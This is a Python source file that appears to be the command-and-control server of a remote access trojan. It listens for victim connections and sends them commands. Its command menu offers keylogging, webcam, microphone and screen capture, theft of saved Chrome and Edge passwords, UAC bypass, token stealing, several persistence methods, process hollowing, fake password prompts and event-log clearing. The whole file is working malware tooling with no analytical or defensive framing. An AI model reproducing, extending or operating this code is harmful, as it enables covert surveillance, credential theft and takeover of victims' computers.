# coding=utf-8
import json
import ntpath
import os
import re
import socket
import struct
import subprocess
import sys
import threading
import time

commands = {'help': ['Show this help'],
            'list': ['List connected clients'],
            'select': ['Select a client by its index'],
            'quit': ['Background current connection'],
            'kill': ['Kill current connection'],
            'cls': ['Clear screen'],
            'lcd': ['Change local working directory'],
            'lls': ['List local files'],
            'upload': ['Upload a file to client'],
            'download': ['Download a file from client'],
            'screenshot': ['Grab a screenshot'],
            'webcam': ['Take a snapshot from webcam'],
            'record': ['Record an audio from microphone'],
            'keylogger': ['Capture keystrokes'],
            'ps': ['List running process'],
            'pkill': ['Terminate a running process'],
            'run': ['Create a process without waiting for termination'],
            'hiderun': ['Create a process in hidden mode'],
            'persistence': ['Apply persistence mechanism'],
            'bypassuac': ['Elevate as administrator without UAC prompt'],
            'stealtoken': ['Duplicate access token from a running process'],
            'browser': ['Extract data from web browser'],
            'getinfo': ['Get system information'],
            'idletime': ['Display how much time the user is inactive'],
            'drives': ['List drives'],
            'startup': ['List startup items'],
            'software': ['List installed software'],
            'ifeo': ['Image file execution options injection'],
            'runpe': ['Process hollowing'],
            'poweroff': ['Perform emergency shutdown'],
            'setcritical': ['Set as critical process'],
            'msgbox': ['Pop up a custom message box'],
            'askuac': ['Ask for UAC elevation'],
            'askpass': ['Pop up a password prompt'],
            'zip': ['Create a zip archive'],
            'unzip': ['Extract files from a zip archive'],
            'openwin': ['Get list of open windows'],
            'activewin': ['Get last active window'],
            'getclip': ['Get clipboard text'],
            'setclip': ['Copy text to clipboard'],
            'filewatch': ['Monitor a directory tree for changes'],
            'procmon': ['Monitor specific process creation'],
            'freeze': ['Block keyboard and mouse input'],
            'openurl': ['Open a url in web browser'],
            'wallpaper': ['Change desktop background'],
            'clearlog': ['Clear event logs']
            }


class Server:

    def __init__(self):
        self.host = ''
        self.port = 9999
        self.socket = None
        self.connections = []
        self.addresses = []

    def listen(self):
        try:
            self.socket = socket.socket()
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            print('[+] Listening on port {}'.format(self.port))
        except socket.error as e:
            print(e)
            sys.exit(1)

    def accept(self):
        while True:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                self.connections.append(conn)
                self.addresses.append(address)
                print('[+] Connection has been established: ' + address[0])
            except Exception as e:
                print('[-] Error accepting connections: ' + str(e))
                time.sleep(5)

    def interact(self):
        while True:
            try:
                cmd = input('flc> ')
                if not cmd:
                    continue
                elif cmd == 'help':
                    Helper.print_help()
                elif cmd in ['quit', 'exit']:
                    self.socket.close()
                    sys.exit(0)
                elif cmd in ['cls', 'clear']:
                    subprocess.call('cls', shell=True)
                elif cmd == 'list':
                    self.list_connections()
                elif 'select' in cmd:
                    conn, target = self.get_target(cmd)
                    if conn is not None:
                        self.send_commands(conn, target)
                elif cmd[:2] == 'cd':
                    Helper.lcd(cmd[3:])
                elif cmd == 'ls':
                    Helper.lls()
                elif cmd.split(' ')[0] == 'alias':
                    Alias.handle_aliases(' '.join(cmd.strip().split()))
                else:
                    print('[-] Command not recognized')
            except KeyboardInterrupt:
                self.socket.close()
                sys.exit(0)
            except Exception as e:
                Helper.print_error('[-] Error: ' + str(e))

    def list_connections(self):
        results = ''
        for i, conn in reversed(list(enumerate(self.connections))):
            try:
                Helper.send(conn, 'null')
                Helper.recv(conn)
            except:
                del self.connections[i]
                del self.addresses[i]
                continue
        for i, conn in enumerate(self.connections):
            results += str(i) + '   ' + str(self.addresses[i][0]) + '   ' + str(self.addresses[i][1]) + '\n'
        print('----- Clients -----' + '\n' + results)

    def get_target(self, cmd):
        try:
            target = cmd.replace('select', '')
            target = int(target)
            conn = self.connections[target]
            try:
                Helper.send(conn, 'null')
                Helper.recv(conn)
            except:
                del self.connections[target]
                del self.addresses[target]
                print('[-] Connection is unavailable')
                return None, None
            print('[+] Connected to ' + str(self.addresses[target][0]))
            return conn, target
        except:
            print('[-] Not a valid selection')
            return None, None

    def send_commands(self, conn, target):
        while True:
            try:
                command = Command()
                cmd = input(Helper.recv_text(conn))
                cmd_name = cmd.split(' ')[0]
                if not cmd:
                    Helper.send(conn, 'null')
                elif cmd_name in Alias.aliases:
                    Alias.send_aliases(conn, ' '.join(cmd.strip().split()))
                elif cmd in ['quit', 'exit']:
                    Helper.send(conn, 'null')
                    break
                elif cmd in ['cls', 'clear']:
                    subprocess.call('cls', shell=True)
                    Helper.send(conn, 'null')
                elif cmd in ['kill', 'poweroff', 'bsod']:
                    Helper.send(conn, cmd)
                    break
                elif cmd in Helper.cmds.keys():
                    print('----- {} -----'.format(cmd))
                    Helper.select(conn, Helper.cmds.get(cmd))
                elif hasattr(command, cmd_name):
                    func = getattr(command, cmd_name)
                    func(conn, cmd)
                else:
                    Helper.send(conn, cmd)
                    print(Helper.recv_text(conn))
            except ConnectionResetError as e:
                print('[-] Connection was lost: ' + str(e))
                del self.connections[target]
                del self.addresses[target]
                break
            except KeyboardInterrupt:
                Helper.send(conn, 'null')
                break
            except Exception as exception:
                Helper.send(conn, 'null')
                Helper.print_error('[-] Error: ' + str(exception))
                continue


class Command:

    @staticmethod
    def lcd(conn, cmd):
        Helper.lcd(Helper.get_args(cmd))
        Helper.send(conn, 'null')

    @staticmethod
    def lls(conn, _):
        Helper.lls()
        Helper.send(conn, 'null')

    @staticmethod
    def upload(conn, cmd):
        filename = Helper.get_args(cmd)
        try:
            if os.path.isfile(filename):
                Helper.send(conn, 'upload ' + os.path.basename(filename))
                Helper.send_file(conn, filename)
                print(Helper.recv_text(conn))
            else:
                print('[-] File not found')
                Helper.send(conn, 'null')
        except Exception as e:
            Helper.print_error('[-] Error: ' + str(e))

    @staticmethod
    def download(conn, cmd):
        filename = Helper.get_args(cmd)
        Helper.send(conn, cmd)
        Helper.recv_file(conn, ntpath.basename(filename))

    @staticmethod
    def screenshot(conn, cmd):
        Helper.send(conn, cmd)
        Helper.recv_file(conn, 'Screenshot{}.png'.format(Helper.get_time()))

    @staticmethod
    def webcam(conn, cmd):
        Helper.send(conn, cmd)
        Helper.recv_file(conn, 'Webcam{}.png'.format(Helper.get_time()))

    @staticmethod
    def record(conn, cmd):
        Helper.send(conn, cmd)
        Helper.recv_file(conn, 'Microphone{}.png'.format(Helper.get_time()))

    @staticmethod
    def keylogger_save(conn, cmd):
        Helper.send(conn, cmd)
        Helper.recv_file(conn, 'Keylog{}.png'.format(Helper.get_time()))

    @staticmethod
    def filewatch(conn, cmd):
        Helper.send(conn, cmd)
        event = threading.Event()

        def recv():
            while True:
                status, data = Helper.recv(conn)
                if status == -1:
                    event.set()
                    break
                print(data.decode())

        threading.Thread(target=recv, daemon=True).start()
        while True:
            cmd = input('filewatch> ')
            if cmd in ['q', 'quit', 'ex', 'exit']:
                Helper.send(conn, 'stop')
                event.wait()
                break


class Alias:
    aliases = {}

    @staticmethod
    def handle_aliases(cmd):
        args = cmd.split(' ')
        if len(args) == 1:
            print('----- Aliases -----')
            for k, v in Alias.aliases.items():
                print('{0:15}{1}'.format(k, v))
            print()
            return
        command = args[0]
        subcommand = args[1]
        if subcommand == 'create':
            if len(args) < 4:
                print('[-] Usage: alias create <alias> <command>')
                return
            alias = cmd.split(' ')[2]
            Alias.aliases[alias] = cmd[len(command + subcommand + alias) + 3:]
            Alias.save_aliases()
            print('[+] Create alias success')
        elif subcommand == 'remove':
            if len(args) < 3:
                print('[-] Usage: alias remove <alias>')
                return
            alias = cmd[len(command + subcommand) + 2:]
            if alias not in Alias.aliases:
                print('[-] Alias does not exist: {}'.format(alias))
                return
            del Alias.aliases[alias]
            Alias.save_aliases()
            print('[+] Remove alias success')
        else:
            print('[-] Unknown command: {}'.format(subcommand))

    @staticmethod
    def load_aliases():
        try:
            if os.path.isfile('alias.json'):
                f = open('alias.json', 'r')
                Alias.aliases = json.load(f)
                f.close()
        except Exception as exception:
            print('[-] Load aliases error: ' + str(exception))

    @staticmethod
    def save_aliases():
        try:
            alias_json = json.dumps(Alias.aliases)
            f = open('alias.json', 'w')
            f.write(alias_json)
            f.close()
        except Exception as exception:
            print('[-] Save aliases error: ' + str(exception))

    @staticmethod
    def send_aliases(conn, cmd):
        command = cmd.split()[0]
        args = cmd[len(command) + 1:].split(' ')
        args = [x for x in args if x]
        prototype = Alias.aliases[command]
        if len(re.findall(r'<.*?>', prototype)) == 0:
            if len(cmd.split(' ')) > 1:
                print('[-] Command takes no argument')
                Helper.send(conn, 'null')
                return
        else:
            if len(args) is len(re.findall(r'<.*?>', prototype)):
                regex = r'<.*?>'
                for arg in args:
                    prototype = re.sub(regex, arg, prototype, count=1)
            else:
                print('[-] Number of arguments does not match')
                Helper.send(conn, 'null')
                return
        print('[+] Sending command: ' + prototype)
        Helper.send(conn, prototype)
        print(Helper.recv_text(conn))


class Helper:
    cmds = {
        'persistence': ['persistence_startup', 'persistence_registry', 'persistence_schtasks', 'persistence_service'],
        'bypassuac': ['bypassuac_fodhelper', 'bypassuac_clr'],
        'keylogger': ['keylogger_start', 'keylogger_stop', 'keylogger_save'],
        'stealtoken': ['stealtoken_system', 'stealtoken_ti', 'stealtoken_admin', 'run_as_user', 'rus_as_admin'],
        'browser': ['get_passwords chrome', 'get_passwords edge', 'get_bookmarks chrome', 'get_bookmarks edge',
                    'get_history chrome', 'get_history edge']
    }

    @staticmethod
    def print_help():
        print('----- Commands -----')
        for k, v in commands.items():
            print('{0:15}{1}'.format(k, v[0]))
        print()

    @staticmethod
    def print_error(msg):
        os.system('')
        print('\033[0;31m' + msg + '\033[0m')

    @staticmethod
    def lcd(path):
        if os.path.exists(path):
            os.chdir(path)
        print(os.getcwd())
        print()

    @staticmethod
    def lls():
        root, dirs, files = next(os.walk(os.getcwd()))
        for dir_name in dirs:
            print(dir_name + '/')
        for filename in files:
            print(filename)
        print()

    @staticmethod
    def select(conn, cmds):
        try:
            for i, cmd in enumerate(cmds):
                print(str(i) + '. ' + cmd)
            print()
            index = input('Please select: ')
            try:
                cmd = cmds[int(index)]
            except (IndexError, ValueError):
                print('[-] Invalid selection')
                Helper.send(conn, 'null')
                return
            Helper.send(conn, cmd)
            print(Helper.recv_text(conn))
        except KeyboardInterrupt:
            Helper.send(conn, 'null')

    @staticmethod
    def get_args(cmd):
        cmd_name = cmd.split(' ')[0]
        cmd_arg = cmd[len(cmd_name) + 1:].strip()
        return cmd_arg

    @staticmethod
    def get_time():
        return str(time.strftime('_%Y%m%d%H%M%S', time.localtime()))

    @staticmethod
    def send(conn, data):
        data = data.encode()
        conn.send(struct.pack('i', len(data)) + data)

    @staticmethod
    def send_file(conn, file):
        size = struct.pack('i', os.stat(file).st_size)
        conn.send(size)
        with open(file, 'rb') as f:
            while True:
                data = f.read(1024)
                if not data:
                    break
                conn.send(data)

    @staticmethod
    def recv(conn):
        head = conn.recv(8)
        status = struct.unpack('i', head[:4])[0]
        size = struct.unpack('i', head[4:8])[0]
        data = b''
        while size:
            buf = conn.recv(size)
            size -= len(buf)
            data += buf
        return status, data

    @staticmethod
    def recv_text(conn):
        _, data = Helper.recv(conn)
        data = data.decode()
        if data == 'null':
            data = ''
        return data

    @staticmethod
    def recv_file(conn, file):
        try:
            status, data = Helper.recv(conn)
            if status == 0:
                print(data.decode())
            else:
                with open(file, 'wb') as f:
                    f.write(data)
                print('[+] File downloaded successfully')
        except Exception as e:
            Helper.print_error('[-] Error: ' + str(e))


server = Server()
server.listen()
threading.Thread(target=server.accept, daemon=True).start()
Alias.load_aliases()
server.interact()
